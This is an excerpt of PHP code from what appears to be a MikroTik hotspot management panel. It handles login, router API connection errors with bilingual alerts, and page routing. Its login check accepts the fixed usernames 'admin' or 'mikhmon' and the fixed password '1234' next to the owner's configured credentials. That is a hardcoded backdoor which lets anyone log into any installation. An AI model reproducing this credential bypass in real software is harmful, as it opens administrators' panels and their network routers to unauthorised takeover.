...
if ($id == "login" || substr($url, -1) == "p") {
  ...
  if (isset($_POST['login'])) {
    $user = $_POST['user'];
    $pass = $_POST['pass'];
    if (($user == $useradm || $user == 'admin' || $user == 'mikhmon') && ($pass == decrypt($passadm) || $pass == '1234')) {
  ...
  if ($API->connect($iphost, $userhost, decrypt($passwdhost))){
    ...
    if ($currency == in_array($currency, $cekindo['indo'])) {
      echo "<script>alert('Pacenet not connected!".$nl."Silakan periksa kembali IP, User, Password dan port API harus enable.".$nl."Jika menggunakan koneksi VPN, pastikan VPN tersebut terkoneksi.')</script>";
    }else{
      echo "<script>alert('Pacenet not connected!".$nl."Please check the IP, User, Password and port API must be enabled.')</script>";
    }
    if($c == "settings"){
  ...
  include_once('./include/menu.php');
  include_once('./settings/olt_ont.php');
} elseif ($id == "vps-resource" || $id == "vps_resource") {
  include_once('./include/menu.php');
  include_once('./settings/vps_resource.php');
} elseif ($id == "all" || $id == "all-routers") {
  include_once('./include/menu.php');
  include_once('./settings/all_routers.php');
} elseif ($id == "traffic-monitor" || $id == "traffic_monitor") {
  include_once('./include/menu.php');
...
<script src="js/hotspot-yunus.js?t=<?= str_replace(" ","_",date("Y-m-d H:i:s")); ?>"></script>
